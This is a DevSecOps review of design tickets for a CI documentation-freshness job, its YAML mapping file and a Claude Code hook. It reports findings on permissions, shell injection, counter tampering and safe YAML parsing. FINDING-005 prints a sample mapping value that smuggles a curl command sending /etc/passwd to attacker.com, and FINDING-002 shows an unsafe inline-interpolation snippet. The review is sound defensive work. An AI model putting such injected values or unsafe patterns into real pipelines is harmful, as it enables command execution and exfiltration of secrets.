# DevSecOps Security Finding Report — Category 2 Tickets (TICKET-4, TICKET-5, TICKET-6)

> Reviewer: eng-devsecops
> Date: 2026-03-09
> Scope: Agentic documentation freshness workflow design
> Artifacts reviewed: `projects/PROJ-030-bugs/work/gh-ticket-drafts.md`, `.github/workflows/ci.yml`, `docs/reference/ci-cd-pipeline-security.md`, `hooks/pre-tool-use.py`

## L0 Executive Summary

| Severity | Count | Immediate Blocker |
|----------|-------|-------------------|
| CRITICAL | 0 | None |
| HIGH | 3 | Must resolve before implementation |
| MEDIUM | 4 | Must resolve before merge to main |
| LOW | 2 | Resolve before GA |
| INFO | 2 | Design notes for implementation team |

Overall pipeline health: **AMBER**. The design intent is sound — deterministic file mapping, no LLM in CI, advisory-only output. However, three HIGH findings identify under-specified attack surfaces that need explicit mitigations in the implementation tickets before any code is written. No CRITICAL findings; the existing pipeline controls (CLCHK-001 env-block pattern, SHA pinning, `uv sync --frozen`) provide a strong baseline to build on.

---

## L1 Findings

### FINDING-001 — HIGH: PR Comment Job Permission Scope Not Specified

**Ticket:** TICKET-4
**Category:** GitHub Actions — permission model

**Finding:**
TICKET-4 proposes a CI job that posts PR comments. The ticket does not specify the required `permissions:` block for this job. The existing `ci.yml` declares `permissions: contents: read / pull-requests: write` at the **workflow level**, which means every job in `ci.yml` inherits `pull-requests: write`. If the new doc-freshness job is added to `ci.yml`, it inherits this permission without the team explicitly acknowledging it. If it becomes its own workflow file, the permission scope is undefined.

`pull-requests: write` allows a job to post comments, modify labels, and close PRs. Granting this to a job that also parses file paths from a config file expands the blast radius if the job is compromised.

**Risk:** A compromised job (e.g., via shell injection in the mapping script) would have write access to PR state on all PRs, not just the ability to read files.

**Remediation:**
- Declare `permissions:` at the **job level** on the doc-freshness job, not inherited from the workflow level:
  ```yaml
  permissions:
    contents: read
    pull-requests: write
  ```
- All other job permissions in the same workflow should be narrowed to `contents: read` where possible, using job-level overrides.
- Document this scoping decision in `docs/reference/ci-cd-pipeline-security.md` alongside the existing CLCHK-001 pattern.

---

### FINDING-002 — HIGH: PR Comment Body Construction Must Follow CLCHK-001 Env-Block Pattern

**Ticket:** TICKET-4
**Category:** Shell injection — `github.event` data handling

**Finding:**
The existing `ci.yml` changelog-check job explicitly documents and applies the CLCHK-001 pattern: untrusted `github.event` strings (PR title, actor) are passed via `env:` blocks, never inline `${{ }}` interpolation in `run:` scripts. TICKET-4 does not carry this constraint forward into its acceptance criteria.

The doc-freshness job will construct PR comment body text. If the implementation assembles the comment via something like:

```yaml
# UNSAFE — do not do this
run: |
  gh pr comment ${{ github.event.pull_request.number }} --body "Stale doc: $FILE_NAME"
```

...where `$FILE_NAME` is derived from mapping file keys (which are repo-controlled and thus trusted), the risk is low for that specific value. But the PR number, branch name, and any other `github.event.*` fields must follow CLCHK-001.

More importantly, the comment posting mechanism (whether `gh pr comment`, `actions/github-script`, or a third-party action) must be identified in the implementation ticket so the correct injection-safe pattern can be specified.

**Risk:** If the implementation uses inline `${{ github.event.pull_request.* }}` in `run:` scripts, a malicious PR title/branch name can inject arbitrary shell commands. This is a known GitHub Actions attack class (CVE pattern: pwn request / pull_request_target misuse).

**Remediation:**
- Add to TICKET-4 acceptance criteria: "PR comment construction MUST follow CLCHK-001 env-block pattern. All `github.event.*` values passed to shell via `env:` block, never inline `${{ }}`."
- Specify the comment mechanism in the design: `actions/github-script` with a JavaScript body that receives env vars is the pattern already used by `pat-monitor.yml` in this repo — use it as the template.
- Pin any new action used for comment posting to a commit SHA, per the existing SHA-pinning policy.

---

### FINDING-003 — HIGH: Escalation Counter Persistence Attack Surface

**Ticket:** TICKET-4
**Category:** Supply chain — state manipulation

**Finding:**
TICKET-4 proposes an escalation path: a doc flagged stale across 3+ consecutive PRs escalates from warning to blocking error. This requires a persistent counter. The ticket does not specify where this state is stored.

If the counter is stored in the repo (e.g., a `.github/doc-staleness-counts.json` file committed back to the branch or to `main`), an attacker with write access to any tracked branch can manipulate the counter file to suppress escalation (reset counts) or force false escalations (inflate counts to block legitimate PRs). If stored externally (GitHub cache, Actions artifacts), cache poisoning attacks apply.

**Risk:** Counter manipulation allows an attacker to either suppress legitimate staleness warnings (defeating the purpose of the feature) or create a denial-of-service where legitimate PRs are blocked by artificially escalated warnings.

**Remediation for the design phase:**
- The simplest safe approach is to compute the staleness count dynamically from PR history using the GitHub API (count consecutive PRs where the source file changed without the doc also changing) rather than storing mutable state. This eliminates the persistent state attack surface entirely.
- If a file-based counter is used, it must be in a branch that only `github-actions[bot]` can write to (protected via branch protection rules), and counter updates must be a separate, audited commit.
- Add to TICKET-4: "Escalation counter storage mechanism MUST be specified in design and reviewed for tamper resistance before implementation."

---

### FINDING-004 — MEDIUM: YAML Mapping File — No Schema Validation in CI

**Ticket:** TICKET-5
**Category:** YAML deserialization safety — mapping config

**Finding:**
TICKET-5 proposes `.github/doc-source-map.yml` and a JSON Schema for validation, with a CI step confirming all referenced paths exist. This is good baseline design. However, the ticket does not specify:

1. Whether the CI parser uses `yaml.safe_load()` (required by the existing M-04b control in `ci.yml`) or a less-safe loader.
2. The depth/complexity limit for the parsed structure (a deeply nested or extremely large YAML file can cause performance issues or parser edge cases).
3. Whether the path values in the mapping are validated as relative paths only, preventing absolute paths or path traversal sequences (`../`, `~`, `/etc/`).

The existing security job in `ci.yml` already enforces `yaml.safe_load()` via grep on `src/`. The new mapping reader — if it is a separate script — would not be covered by that check unless explicitly included.

**Risk:** `yaml.load()` with full deserializer enables arbitrary Python object instantiation. Path traversal in mapping values could cause the CI script to check existence of or read files outside the repo tree. Medium severity because the mapping file is in the repo (controlled), but a malicious PR could modify it.

**Remediation:**
- The mapping reader script must use `yaml.safe_load()`. Extend the M-04b CI grep check to include the new script's location (e.g., `scripts/check_doc_freshness.py`).
- Path values must be validated: strip leading `/`, reject `..` components, resolve within `os.path.abspath(repo_root)` and confirm the result is a descendant of the repo root.
- Add a maximum mapping file size limit (e.g., 100KB) to prevent resource exhaustion from a maliciously large YAML blob.
- Add to TICKET-5 acceptance criteria: "Mapping reader uses `yaml.safe_load()`. Path values validated as repo-relative with no traversal sequences."

---

### FINDING-005 — MEDIUM: Glob Pattern Injection in Source-to-Doc Mapping

**Ticket:** TICKET-5
**Category:** Shell injection — CI script

**Finding:**
TICKET-5 includes a wildcard mapping: `.github/workflows/*.yml` -> `docs/explanation/ci-cd-supply-chain-security.md`. When the CI script processes this mapping, it must resolve the glob pattern against the list of files changed in the PR. If the script passes these patterns to a shell command (e.g., `git diff --name-only | grep "$PATTERN"`), a crafted pattern in the mapping file could inject shell metacharacters.

For example, if a PR modifies `.github/doc-source-map.yml` to contain:
```yaml
sources:
  - "*.yml; curl attacker.com -d $(cat /etc/passwd)"
```
...and the CI script passes this to a shell `grep` or `find` command without quoting, the result is command injection.

**Risk:** Command injection in CI with `contents: read` and `pull-requests: write` permissions. Medium severity because the attacker must land a PR modifying the mapping file (requires at minimum write access or a compromised fork PR — but fork PRs against `pull_request` events do NOT have access to secrets, reducing impact).

**Remediation:**
- The mapping reader must treat all values from the YAML file as data, never as shell arguments. Use Python's `pathlib.Path.match()` or `fnmatch.fnmatch()` for pattern matching — these are pure Python and never invoke a shell.
- The CI script for changed-file detection must use `git diff --name-only` with output captured in Python (via `subprocess.run(..., capture_output=True)`) and iterated in Python — never piped to shell with YAML-derived values.
- Document this constraint in TICKET-5 acceptance criteria: "Pattern matching MUST use Python fnmatch/pathlib, never shell glob expansion with YAML-derived values."

---

### FINDING-006 — MEDIUM: New CI Job Must Be Added to `ci-success` Gate

**Ticket:** TICKET-4
**Category:** CI gate wiring

**Finding:**
The `ci-success` gate job in `ci.yml` explicitly enumerates every job in its `needs:` list. If the new doc-freshness job is added to `ci.yml` without being added to `ci-success`'s `needs:` list, it becomes a detached job — it runs but its failure does not block merging. The CLCHK-003 comment in `ci.yml` already documents this pattern for PR-only jobs (changelog-check uses the skipped-state exception).

Given TICKET-4 specifies the job is advisory (warning, not blocking) in Phase 1, there may be intentional design to not add it to `ci-success`. However, this must be an explicit decision, not an omission.

**Risk:** An advisory job not wired into `ci-success` is silently skipped by branch protection. If Phase 2 escalates it to blocking without the `ci-success` wiring, the escalation has no enforcement effect.

**Remediation:**
- Add to TICKET-4 acceptance criteria: "Specify whether the doc-freshness job is added to `ci-success` `needs:`. If advisory-only in Phase 1, document this as an explicit decision and add a TODO for Phase 2 wiring."
- Follow the CLCHK-003 pattern for the skipped-state exception if the job is PR-only.
- If using a separate workflow file instead of `ci.yml`, document why branch protection rules will still enforce the gate.

---

### FINDING-007 — MEDIUM: Hook Reads from YAML File — Needs Failure-Safe Error Handling

**Ticket:** TICKET-6
**Category:** Hook security — local environment

**Finding:**
The proposed `pre_tool_use` hook reads `.github/doc-source-map.yml`. The existing hook architecture (as seen in `hooks/pre-tool-use.py`) exits `0` on any exception — this is intentional, ensuring hook failures never block Claude Code operation. TICKET-6's hook must follow the same pattern.

However, if the hook emits an advisory message to stdout/stderr in a format that Claude Code interprets as a blocking directive (rather than pure advisory text), the advisory-only intent is violated. The Claude Code hooks API interprets specific JSON fields from hook stdout to block or allow tool calls. If the hook accidentally outputs valid JSON with a `block` or `decision: "block"` field, it becomes a de facto blocker.

Additionally, if `.github/doc-source-map.yml` is absent (e.g., the hook is installed globally and run against a non-Jerry repo), the hook must not crash or emit confusing output.

**Risk:** Accidental blocking of Claude Code tool calls if hook output is mis-formatted. Confusing error output if the mapping file is absent. Low probability but the failure mode is user-visible and disruptive.

**Remediation:**
- The hook must output advisory text to stderr only, never to stdout (which Claude Code parses for JSON directives). Or explicitly output valid JSON with `{"decision": "allow", "reason": "..."}` if stdout JSON is used.
- On missing mapping file: silently exit 0, no output. Log optionally to stderr only if a debug flag is set.
- On YAML parse error: silently exit 0, no output. Do not propagate stack traces to stdout.
- Add to TICKET-6 acceptance criteria: "Hook outputs advisory to stderr only. Exits 0 on all error conditions (missing file, parse error, schema error). Never outputs a JSON block directive."

---

### FINDING-008 — LOW: SHA Pinning Required for Any New PR Comment Action

**Ticket:** TICKET-4
**Category:** Supply chain — new action dependency

**Finding:**
If TICKET-4's implementation introduces a new GitHub Action for posting PR comments (e.g., a community action like `peter-evans/create-or-update-comment`), that action must be SHA-pinned and added to the SHA-to-version mapping table in `docs/reference/ci-cd-pipeline-security.md`. The existing repo already uses `MishaKav/pytest-coverage-comment` for the coverage-report job — a precedent for community actions in this pipeline.

The Dependabot `github-actions` ecosystem monitoring will cover the new action automatically once SHA-pinned. However, inline pins in `run:` blocks (if the implementation uses `gh pr comment` via GitHub CLI) are not monitored by Dependabot and must be tracked manually.

**Risk:** Unpinned community action is a supply chain vector (tag mutation). Low severity because adding a new action requires a PR that goes through CI — but the risk accumulates over time if the pin is not maintained.

**Remediation:**
- Any new `uses:` reference must follow the existing SHA-pinning policy on day one, not as a follow-up.
- Prefer `actions/github-script` (already SHA-pinned in this repo, see `pat-monitor.yml`) over a new community action.
- Add the pin to the SHA-to-version table in `docs/reference/ci-cd-pipeline-security.md` in the same PR that adds the job.

---

### FINDING-009 — LOW: Hook Installation Path — Global vs. Per-Project Scope

**Ticket:** TICKET-6
**Category:** Hook security — scope

**Finding:**
The ticket does not specify whether the hook is registered in `.claude/settings.json` (project-scoped, applies only to this repo) or in the global Claude Code settings (applies to all Claude Code sessions for the user). The mapping file `.github/doc-source-map.yml` is repo-specific. If the hook is installed globally, it will attempt to read a file that does not exist in non-Jerry repos, causing the error-handling scenario described in FINDING-007.

**Risk:** Confusing behavior when working across multiple repos. Silent failure (per the fix for FINDING-007) is tolerable but should be an explicit design choice.

**Remediation:**
- Specify in TICKET-6 that the hook is project-scoped (registered in `.claude/settings.json`, following the existing hooks registration pattern).
- Document the project-scope constraint in the hook's docstring.

---

### FINDING-010 — INFO: Trigger Event for CI Job — `pull_request` vs `pull_request_target`

**Ticket:** TICKET-4
**Category:** Design note — GitHub Actions trigger security

**Finding:**
The existing `ci.yml` triggers on `pull_request` (not `pull_request_target`). The doc-freshness job should follow the same trigger. `pull_request_target` runs with write access to the base branch and has access to secrets — it is intended for workflows that need to comment on PRs from forks but require trusted context. Using `pull_request_target` for a job that reads from the fork's `doc-source-map.yml` would create a privileged read of untrusted content.

`pull_request` events from forks run with read-only permissions and no secret access. The doc-freshness job does not need secrets; it only needs `pull-requests: write` to post comments. This works correctly with `pull_request` events.

**Risk:** Informational — if the implementer is unfamiliar with the distinction, they may choose `pull_request_target` to "ensure write access for comments." This is unnecessary and dangerous.

**Remediation:**
- Add to TICKET-4 design notes: "Trigger MUST use `pull_request` event, not `pull_request_target`. The `pull-requests: write` permission is available to `pull_request` events when scoped at the job level."

---

### FINDING-011 — INFO: Escalation Counter Is Not in Scope for TICKET-4 Implementation

**Ticket:** TICKET-4
**Category:** Design scope note

**Finding:**
The escalation counter mechanism (advisory -> blocking after 3+ consecutive PRs) significantly increases implementation complexity and the attack surface (see FINDING-003). The existing pattern in this repo is to scope features narrowly and add complexity in follow-up tickets.

The acceptance criteria list the escalation counter as a required item for this ticket. Given the unresolved design questions (storage mechanism, tamper resistance), it may be more appropriate to scope the initial implementation to advisory-only (no escalation) and create a separate ticket for the escalation mechanism once the storage design is reviewed.

**Remediation:**
- Consider splitting TICKET-4: Phase 1 is advisory-only (no counter, no escalation). Phase 2 is escalation mechanism after storage design is reviewed.
- This is a design recommendation, not a security requirement. The implementer may retain the counter in scope if the storage mechanism is specified and reviewed.

---

## L2 Strategic Implications

**Tool coverage gaps for this feature area:**

The existing pipeline has no tooling for configuration file integrity monitoring beyond the M-04b grep. The proposed `.github/doc-source-map.yml` introduces a new attack surface category (trusted config files that influence CI behavior) with no existing scanner coverage. Recommend adding this file to a CI step that validates it against its JSON Schema on every push — not just PRs.

**SAST gap:** The M-04b yaml.load() check only covers `src/`. Any new script placed in `scripts/` that reads YAML must be explicitly included in the grep scope, or the check should be generalized to cover `scripts/` and `hooks/` directories.

**False positive rate prediction:** The doc-freshness mapping is expected to have a moderate false positive rate for large refactoring PRs that touch many source files without requiring doc updates. The advisory-only design (TICKET-4) correctly handles this — blocking on false positives would be high-friction. The escalation mechanism (3 consecutive PRs) must account for deliberate no-update decisions (e.g., a refactor that doesn't change the documented behavior).

**SLSA relevance:** The mapping file (`.github/doc-source-map.yml`) will influence CI behavior. Under SLSA Level 2, this file should be treated as a build input and included in provenance attestations if the repo pursues SLSA compliance in future phases.
